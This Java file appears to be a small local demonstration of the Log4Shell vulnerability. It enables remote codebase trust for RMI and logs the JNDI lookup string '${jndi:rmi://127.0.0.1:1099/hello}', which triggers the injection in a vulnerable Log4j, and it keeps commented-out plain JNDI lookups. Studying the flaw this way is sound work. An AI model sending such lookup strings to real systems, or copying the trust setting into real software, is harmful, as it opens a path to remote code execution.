package com.wrh.jndidemo;


import org.apache.logging.log4j.LogManager;
import org.apache.logging.log4j.Logger;

/**
 * @author wuruohong
 * @Classname RmiClient
 * @Description TODO
 * @Date 2021/12/14 10:54
 */
public class RmiClient {

    private static final Logger logger = LogManager.getLogger(RmiClient.class);

    public static void main(String[] args) throws Exception {
        /*Hashtable env = new Hashtable() ;
        env.put(Context.INITIAL_CONTEXT_FACTORY,"com.sun.jndi.rmi.registry.RegistryContextFactory");
        env.put(Context.PROVIDER_URL, "rmi://localhost:1099");
        Context ctx = new InitialContext(env);
        RmiService service = (RmiService) ctx.lookup("hello");
        System.out.println(service.sayHello());*/

        /*System.setProperty("com.sun.jndi.rmi.object.trustURLCodebase","true");
        Hashtable env = new Hashtable();
        env.put(Context.INITIAL_CONTEXT_FACTORY, "com.sun.jndi.rmi.registry.RegistryContextFactory");
        env.put(Context.PROVIDER_URL, "rmi://localhost:1099");
        Context ctx = new InitialContext(env);
        ctx.lookup("hello");*/


        System.setProperty("com.sun.jndi.rmi.object.trustURLCodebase","true");
        logger.error("${jndi:rmi://127.0.0.1:1099/hello}");
        Thread.sleep(5000);

    }
}
